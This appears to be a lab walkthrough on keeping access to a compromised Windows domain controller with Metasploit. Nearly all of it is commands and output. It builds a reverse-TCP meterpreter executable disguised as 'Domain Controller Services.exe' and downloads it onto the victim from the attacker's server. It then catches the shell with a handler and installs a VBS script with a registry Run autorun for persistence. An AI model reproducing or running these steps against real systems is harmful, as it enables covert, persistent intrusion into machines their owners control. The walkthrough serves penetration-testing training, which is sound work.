# Introduction
Metasploit framework can be used for maintaining access on a windows machin

# Process

## Creating payload with msfconsole

```console
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.0.215 LPORT=4444 -f exe -o Domain\ Controller\ Services.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: Domain Controller Services.exe
```
- Move this payload to the compromised machine.

```console
PS C:\Users\Administrator\Downloads> wget 'http://10.17.0.215/Domain Controller Services.exe' -o "Domain Controller Services.exe"
PS C:\Users\Administrator\Downloads> ls

    Directory: C:\Users\Administrator\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/11/2022   8:44 PM          73802 Domain Controller Services.exe
-a----        5/14/2020  11:39 AM        1261832 mimikatz.exe
-a----        5/14/2020  11:41 AM         374625 PowerView.ps1
-a----        5/14/2020  11:43 AM         973325 SharpHound.ps1
-a----       11/11/2022   8:09 PM           1383 ticket.kirbi
```
- Start msfconsole on attacking machine.

```console
❯ msfconsole

                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v6.2.9-dev                           ]
+ -- --=[ 2230 exploits - 1177 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View a module's description using
info, or the enhanced version in your browser with
info -d

msf6 >

```
- Create listener on the port which we had set earlier.

```console
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```

- Set LHOST 

```console
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be speci
                                     fied)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.17.0.215
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.17.0.215      yes       The listen address (an interface may be speci
                                     fied)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```
- Configure payload to be windows meterpreter shell

```console
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```


- Exploit on msfconsole

```console
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.17.0.215:4444 

```

- Start exploit (`*.exe`) on compromised machine.

```console
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.17.0.215:4444
[*] Sending stage (175686 bytes) to 10.10.211.102
[*] Meterpreter session 1 opened (10.17.0.215:4444 -> 10.10.211.102:50095) at 2022-11-12 10:23:18 +0530

meterpreter >
```

## Run persistence module
- Background the running meterpreter session.

```console
meterpreter > background
[*] Backgrounding session 1...
```

- Start windows persistence module 

```console
msf6 exploit(multi/handler) > use exploit/windows/local/persistence
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```
- Check all the options


```console
msf6 exploit(windows/local/persistence) > sessions

Active sessions
===============

  Id  Name  Type                    Information             Connection
  --  ----  ----                    -----------             ----------
  1         meterpreter x86/window  CONTROLLER\Administrat  10.17.0.215:4444 -> 10
            s                       or @ DOMAIN-CONTROLL    .10.211.102:50095 (10.
                                                            10.211.102)

msf6 exploit(windows/local/persistence) > set session 1
session => 1
msf6 exploit(windows/local/persistence) > show options

Module options (exploit/windows/local/persistence):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DELAY     10               yes       Delay (in seconds) for persistent payload
                                        to keep reconnecting back.
   EXE_NAME                   no        The filename for the payload to be used on
                                         the target host (%RAND%.exe by default).
   PATH                       no        Path to write payload (%TEMP% by default).
   REG_NAME                   no        The name to call registry value for persis
                                        tence on target host (%RAND% by default).
   SESSION   1                yes       The session to run this module on
   STARTUP   USER             yes       Startup type for the persistent payload. (
                                        Accepted: USER, SYSTEM)
   VBS_NAME                   no        The filename to use for the VBS persistent
                                         script on the target host (%RAND% by defa
                                        ult).


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread,
                                         process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be sp
                                        ecified)
   LPORT     4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Windows
```

- Start the exploit

```console
msf6 exploit(windows/local/persistence) > exploit

[*] Running persistent module against DOMAIN-CONTROLL via session ID: 1
[+] Persistent VBS script written on DOMAIN-CONTROLL to C:\Users\Administrator\AppData\Local\Temp\rHwRqhjdxrr.vbs
[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\CjabdL
[+] Installed autorun on DOMAIN-CONTROLL as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\CjabdL
[*] Clean up Meterpreter RC file: /home/divu050704/.msf4/logs/persistence/DOMAIN-CONTROLL_20221112.2807/DOMAIN-CONTROLL_20221112.2807.rc

```
